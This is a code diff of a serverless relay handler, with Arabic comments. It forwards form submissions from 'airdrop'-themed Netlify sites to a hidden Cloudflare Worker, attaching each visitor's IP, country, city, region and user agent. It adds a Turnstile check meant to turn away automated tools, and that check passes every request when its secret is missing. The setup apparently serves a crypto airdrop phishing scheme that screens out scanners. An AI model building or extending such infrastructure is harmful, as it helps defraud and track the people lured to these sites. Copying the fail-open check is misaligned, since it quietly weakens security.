@@ -5,11 +5,14 @@ const WORKER_URL = "https://1fuckurmotherhahahahahahaha.eth2-stiffness640.worker
 
 // 🔒 السماح فقط لموقعك الحقيقي
 const ALLOWED_ORIGINS = [
-  "https://big-airdrop.netlify.app"
+  "https://swap-airdrops.netlify.app"
 ];
 
 // 🔑 السرّ السري بين Vercel ↔ Worker (Vercel → Settings → Environment Variables)
 const RELAY_SECRET = process.env.RELAY_SECRET || "";
+
+// 🔑 سرّ Cloudflare Turnstile للتحقق من بشرية الطلب (Server-side)
+const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || "";
 
 // دالة لاستخراج Origin من Referer (لو المتصفح ما أرسل Origin)
 function originFromReferer(referer = "") {
@@ -22,16 +25,42 @@ function originFromReferer(referer = "") {
   }
 }
 
+// ✅ دالة التحقق من Turnstile (server-side)
+async function verifyTurnstile(token, ip) {
+  if (!TURNSTILE_SECRET) {
+    // إن لم تضع المفتاح في البيئة نعيد قبولًا لتجنب كسر الإنتاج مؤقتًا
+    // يُفضّل تفعيل الشرط الصارم لاحقًا:
+    // throw new Error("TURNSTILE_SECRET missing");
+    return { success: true, bypass: true };
+  }
+
+  const form = new URLSearchParams();
+  form.append("secret", TURNSTILE_SECRET);
+  form.append("response", token || "");
+  if (ip) form.append("remoteip", ip);
+
+  const resp = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
+    method: "POST",
+    body: form
+  });
+
+  let data;
+  try { data = await resp.json(); } catch { data = { success: false, parse_error: true }; }
+  return data;
+}
+
 export default async function handler(req, res) {
   const reqOrigin = req.headers.origin || "";
   const referer = req.headers.referer || "";
   const origin = reqOrigin || originFromReferer(referer);
 
-  // استخرج IP الحقيقي والدولة من هيدرز Vercel
+  // استخرج IP الحقيقي والدولة والمدينة/المنطقة من هيدرز Vercel
   const fwdFor = req.headers["x-forwarded-for"] || "";
   const clientIPHeader = Array.isArray(fwdFor) ? fwdFor[0] : fwdFor;
   const realClientIP = (clientIPHeader || "").split(",")[0].trim(); // أول IP في السلسلة
   const clientCountry = req.headers["x-vercel-ip-country"] || "";   // قد تكون فارغة أحيانًا
+  const clientCity    = req.headers["x-vercel-ip-city"] || "";
+  const clientRegion  = req.headers["x-vercel-ip-country-region"] || "";
   const clientUA = req.headers["user-agent"] || "";
 
   // --- OPTIONS (preflight) ---
@@ -59,18 +88,41 @@ export default async function handler(req, res) {
   }
 
   try {
+    // ✅ تأكد من وجود body ككائن
+    const body = typeof req.body === "object" && req.body !== null ? req.body : {};
+    // استخرج توكن Turnstile من الواجهة (اسم الحقل حسب ما وضعتَه في الـHTML)
+    const turnstileToken =
+      body.turnstile ||
+      body.cf_turnstile_response ||
+      body["cf-turnstile-response"] ||
+      ""; // أي اسم من هذه الأسماء الشائعة
+
+    // ✅ التحقق من Turnstile (يردع الأدوات/الهيدلس)
+    const verify = await verifyTurnstile(turnstileToken, realClientIP);
+    if (!verify?.success) {
+      res.setHeader("Access-Control-Allow-Origin", origin);
+      res.setHeader("Vary", "Origin");
+      return res.status(403).json({
+        error: "Turnstile verification failed",
+        codes: verify?.["error-codes"] || [],
+        details: verify
+      });
+    }
+
     // --- تمرير الطلب للـWorker + إضافة X-Relay-Secret + معلومات العميل الحقيقي ---
     const response = await fetch(WORKER_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
         "Origin": origin,
-        "X-Relay-Secret": RELAY_SECRET,     // حماية القناة بين Vercel ↔ Worker
-        "X-Client-IP": realClientIP || "",  // IP الحقيقي للزائر
-        "X-Client-Country": clientCountry,  // الدولة (إن توفرت)
-        "X-Client-UA": clientUA             // User-Agent الحقيقي (اختياري مفيد)
+        "X-Relay-Secret": RELAY_SECRET,      // حماية القناة بين Vercel ↔ Worker
+        "X-Client-IP": realClientIP || "",   // IP الحقيقي للزائر
+        "X-Client-Country": clientCountry,   // الدولة (إن توفرت)
+        "X-Client-City": clientCity,         // المدينة (إن توفرت)
+        "X-Client-Region": clientRegion,     // المنطقة/المقاطعة (إن توفرت)
+        "X-Client-UA": clientUA              // User-Agent الحقيقي (اختياري مفيد)
       },
-      body: JSON.stringify(req.body)
+      body: JSON.stringify(body)
     });
 
     const raw = await response.text();
